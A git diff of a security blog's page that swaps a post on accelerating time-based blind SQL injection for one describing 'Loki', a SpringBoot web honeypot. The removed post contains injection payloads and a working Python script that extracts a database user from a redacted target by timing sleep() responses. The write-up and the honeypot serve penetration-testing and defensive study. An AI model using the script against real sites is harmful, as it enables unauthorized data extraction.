@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>极端条件下时间盲注加速的另一种思路 | CoolCat&#39; Blog</title>	
+<title>Loki - 一个轻量级Web蜜罐 | CoolCat&#39; Blog</title>	
 
 <link rel="stylesheet" href="/styles/main.css">
 <script type="text/javascript">
@@ -64,7 +64,7 @@ window.onload=getCSS();
 			
 		<header id="header" class="site-header" 
 		
-		style="background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)),url(https://thekingofduck.github.io/post-images/sql-inject-bypass.jpg)"
+		style="background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)),url(https://thekingofduck.github.io/post-images/loki-web-honeypot.png)"
 		
 		>
 			<div class="site-branding">
@@ -154,10 +154,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">极端条件下时间盲注加速的另一种思路</h1>
+			<h1 class="wow swing entry-title">Loki - 一个轻量级Web蜜罐</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-10-24 19:27:33" itemprop="datePublished" pubdate="">2020-10-24</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2021-01-31 19:42:23" itemprop="datePublished" pubdate="">2021-01-31</time></i>
 	          </div>
 			
 </span>
@@ -165,101 +165,127 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>摸底情况</p>
-<p>环境:<code>python</code>+<code>django</code>+<code>pymysql</code></p>
-<p>注入点应该是出现在order by 后面,无回显,程序会分离<code>;</code>符号,并当做两个语句来执行,也就是存在堆叠注入,丢给sqlmap跑确实也识别出来了,但是没法正常跑数据,人工探测发现mysql字符处理相关的函数均无法正常执行(过滤or写法问题?),离谱的是ifnull这类函数都无法执,探测下来已知的可执行的函数只有<code>sleep()</code>,<code>length()</code>,<code>users()</code>,<code>version()</code>等这类可执行。</p>
-<p>只能时间盲注没得选,绕过也容易,payload如下:</p>
-<pre><code>select case when((select binary database()) like &quot;test%&quot;)then sleep(3) else sleep(0) end;
+				<p>https://github.com/TheKingOfDuck/Loki</p>
+<h3 id="0x01-why">0x01 Why</h3>
+<p>目标: 抓漏洞.<br>
+大概是没有找到啥子开源的符合我预期的蜜罐吧，所以自己动手写了。</p>
+<h3 id="0x02-what">0x02 What</h3>
+<p>想做什么样的蜜罐?</p>
+<p>1.便于维护,随开随用,配置简单。<br>
+2.Web低仿真即可,且只抓Web流量。<br>
+3.不同端口指向不同的页面,响应头配置等。</p>
+<h3 id="0x03-how">0x03 How</h3>
+<p>SpringBoot是最强Web框架没有之一,数据库选用SQLite。两者结合基本上就可以实现一个jar加db文件就完成需求。</p>
+<h3 id="0x04-process">0x04 Process</h3>
+<p>管理页面选用layui作为前端框架,后台地址和端口以及账号密码通过配置文件动态配置。</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1612093490242.jpg" alt="" loading="lazy"></figure>
+<p>多端口方便其实就是给tomcat添加几个监听的端口而已:</p>
+<pre><code>Connector connector = new Connector(&quot;org.apache.coyote.http11.Http11NioProtocol&quot;);
+connector.setScheme(scheme);
+connector.setPort(Integer.parseInt(port));
+result.add(connector);
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1603551425773.jpg" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1603551438310.jpg" alt="" loading="lazy"></figure>
-<p>不允许操作字符那就不操作,只对比就好。写完Poc产生一个问题。平常盲注都是查询出单个字符串再去和所有字符串对比,但如果把模糊查询条件改成<code>like &quot;%a%&quot;</code>,先查询一下所有字符串字符串，看是否在目标字段中,并将存在于目标字段中的字符聚合起来,再用<code>like &quot;abc%&quot;</code>去将存在的字符串进行排序,效率会不会高很多？</p>
-<p>假设查询结果为:<code>95b17c3b195983f7ef37358a6db07e35</code><br>
-不考虑特俗字符串,盲注情况以下62个字符串需要对比:</p>
-<pre><code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
-</code></pre>
-<p>不适应任何技巧情况下最多需要需要对比32x62=1984次</p>
-<p>先将查询结果转成ASCII码,上诉62个字符的ASCII码进行二分法对比,最多需要对比ln62/ln2*32≈192次</p>
-<p>使用上诉思路查询最多次数为62 + 14*32 = 510,其中14为查询结果中出现的14个独立字符串,假设值为<code>00000000000000000000000000000000</code>时，最坏查询次数为62 + 1*32 = 94,也就是说查询结果重复得越多查询次数越少,正常情况下还是不如转ascii再二分法对比效果好,但如果遇到这种不能分割字符串的情况,这也不失是个方法。</p>
-<p>demo:</p>
-<pre><code>import requests
-import urllib3
+<p>然后是不同端口指向不同页面:</p>
+<p>配置文件</p>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1612093569434.jpg" alt="" loading="lazy"></figure>
+<p>判断逻辑</p>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1612093585093.jpg" alt="" loading="lazy"></figure>
+<p>port是限制的端口,path是本地模板的路径,code是返回的状态码,header是相应的header,respbody本来是想正对一些特定的请求返回不同页面的,逻辑没有思考的很清楚,暂时搁置了。</p>
+<h4 id="页面捕获">页面捕获</h4>
+<p>过程比较耗时间,期初想拦截所有异常,在做统一处理即可,可实际过程发现springboot默认开起了add-mappings无法捕获404页面,而且静态资源过来的请求无法捕获,如果遇到解析差异那种洞就只能错过。关闭的话静态资源访问配置又会很麻烦。</p>
+<p>查阅相关文档后发现可以继承  ErrorController + @ControllerAdvice + @ExceptionHandle 处理一切异常,这也包括404页面,</p>
+<p>Demo:</p>
+<pre><code>NotFoundController.java
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-proxies = {
-  &quot;http&quot;:  &quot;http://127.0.0.1:8080&quot;,
-  &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;,
+@Controller
+public class NotFoundController implements ErrorController {
+ 
+    @Override
+    public String getErrorPath() {
+        return &quot;/error&quot;;
+    }
+    @RequestMapping(value = {&quot;/error&quot;})
+    public Object error(HttpServletRequest request) {
+        //请求处理
+        return &quot;404&quot;;
+    }
 }
-
-def sqli(payload):
-
-    session = requests.Session()
-
-    paramsGet = {
-        &quot;dxxxxx&quot;: &quot;xxxx');{}&amp;&quot;.format(payload)}
-    headers = {&quot;Connection&quot;: &quot;close&quot;,
-               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; pt-br) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13&quot;,
-               &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;}
-    cookies = {&quot;SESSION&quot;: &quot;r5q1phi49syxxxxxxxxxxxxxxxxxxxxxxxxxxxxrod59m3u2t&quot;}
-
-    try:
-        session.get(&quot;https://xxxxxxxxxxxxxxxxxxxxxxch&quot;, params=paramsGet,
-                               headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=3)
-        return False
-    except:
-        return True
-
-
-if __name__ == '__main__':
-
-
-    #select case when((select database()) like \&quot;%%\&quot;)then sleep(2) else sleep(0) end;
-    existStrs = &quot;&quot;
-
-    strs = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@.ß&quot;
-    print(&quot;[+] 正在遍历返回值中存在的字符串...&quot;)
-    for s in strs:
-        payload = &quot;select case when((select binary user()) like \&quot;%{}%\&quot;)then sleep(2) else sleep(0) end;&quot;.format(s)
-        if sqli(payload):
-            existStrs += s
-            print(existStrs)
-
-    print(&quot;[+] 返回值中存在的字符串共有: {}&quot;.format(existStrs))
-    print(&quot;[+] 返回值排序中...&quot;)
-
-    result = &quot;&quot;
-
-    for num in range(1,15):
-        tmp = &quot;&quot;
-        for s2 in existStrs:
-            tmp = result + s2
-            payload2 = &quot;select case when((select binary user()) like \&quot;{}%\&quot;)then sleep(2) else sleep(0) end;&quot;.format(tmp)
-            if sqli(payload2):
-                result += s2
-                break
-        print(result)
-    print(&quot;[+] 返回值: {}&quot;.format(result))
-
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1603551452123.jpg" alt="" loading="lazy"></figure>
+<pre><code>ExceptionController.java
+
+@ControllerAdvice
+public class ExceptionController {
+ 
+    @ExceptionHandler(value = {Exception.class})
+    public Object error(Exception ex){
+        //请求处理
+        return &quot;500&quot;;
+    }
+}
+</code></pre>
+<p>这也处理确实能捕获到404页面,可是有个bug</p>
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1612093604938.jpg" alt="" loading="lazy"></figure>
+<p>getServletPath方法获取的路由恒为error,这也是springboot的特征之一,所有错误均会交由error路由处理,也就是说error默认是肯定存在的。</p>
+<p>正确的处理方式是在过滤器中进行记录:</p>
+<pre><code>public class LokiFilter implements Filter{
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+        log.info(&quot;Loki Filter is init.... &quot;);
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
+        HttpServletRequest request = (HttpServletRequest) servletRequest;
+        //请求处理
+        filterChain.doFilter(request, response);
+    }
+
+    @Override
+    public void destroy() {
+        log.info(&quot;Loki Filter was destroyed....&quot;);
+    }
+}
+</code></pre>
+<p>嗯,内存马也得在这层搞,不然鬼知道别人路由咋写的。</p>
+<h3 id="0x05-result">0x05 Result</h3>
+<p>代码结构:</p>
+<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1612093623129.png" alt="" loading="lazy"></figure>
+<p>后台页面:</p>
+<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1612093636730.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1612093761078.png" alt="" loading="lazy"></figure>
+<p>模板文件:</p>
+<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1612093774985.jpg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/1612093789285.jpg" alt="" loading="lazy"></figure>
+<p>一些有趣的事情:</p>
+<p>1.在公网跑起来后我收到的第一个请求是nmap扫cobaltstrike的。</p>
+<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1612093806150.png" alt="" loading="lazy"></figure>
+<p>2.配置的通达和致远的页面都被来自河南和云南的两个IP人为访问过两次,识别依据是浏览器会自动加载/favicon.ico,脚本不会。</p>
+<p>3.被89.248.160.151这个IP扫了一通.txt的文件,还有一些请求路径是@.txt,不知道是不是扫描器没配好。</p>
+<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1612093827620.png" alt="" loading="lazy"></figure>
+<p>4.创宇的censys爬虫先是先访问了8090端口,然后是88端口,中间间隔了将近14小时,bing的爬虫也到访过一次,fofa的爬虫没看到,但是有上百条ua为Go-http-client/1.1和fasthttp的请求,python的只有一条。</p>
+<p>5.捕获了两个漏洞:</p>
+<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/1612093839683.jpg" alt="" loading="lazy"></figure>
+<p>搜索了一下应该是Linksys路由的命令注入.</p>
+<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/1612093860509.png" alt="" loading="lazy"></figure>
+<p>看起来是未授权相关的漏洞,80端口配置了很低从其他蜜罐上扒下来的Server头,可能是其中一款产品的洞吧,涉及的产品太多,百度没搜到这个路由,无法验证了。</p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
-				<a href="https://thekingofduck.github.io/tag/u1G11Fcfr/" rel="tag">注入绕过</a>	
+				<a href="https://thekingofduck.github.io/tag/NAVhRH9M0/" rel="tag">蜜罐</a>	
 				 
-				<a href="https://thekingofduck.github.io/tag/i4bz1WdICs/" rel="tag">渗透测试</a>	
+				<a href="https://thekingofduck.github.io/tag/3cO71LLYX/" rel="tag">java</a>	
+				 
+				<a href="https://thekingofduck.github.io/tag/PrwAU8pcS/" rel="tag">安全开发</a>	
 				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://thekingofduck.github.io/post/loki-yi-ge-qing-liang-ji-web-mi-guan/" rel="prev"> Loki - 一个轻量级Web蜜罐</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://thekingofduck.github.io/post/recode-captcha-killer/" rel="next"> captcha-killer修改随笔</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://thekingofduck.github.io/post/loki-yi-ge-qing-liang-ji-web-mi-guan/" rel="next"> Loki - 一个轻量级Web蜜罐</a></div>
 		
 		</div>
 	</nav>
